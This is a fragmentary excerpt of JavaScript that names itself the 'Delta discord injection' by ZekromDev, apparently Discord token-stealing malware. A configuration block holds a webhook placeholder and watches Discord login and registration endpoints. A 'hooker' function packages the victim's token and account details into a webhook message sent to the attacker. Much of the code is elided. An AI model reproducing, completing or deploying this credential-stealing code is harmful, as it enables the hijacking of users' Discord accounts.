...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://github.com/ZekromDev/InjectionDiscord/edit/main/index.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "Delta - cord injection";
    ...
    content["embeds"][0]["footer"] = {
        "text": "Delta discord injection - made by ZekromDev",
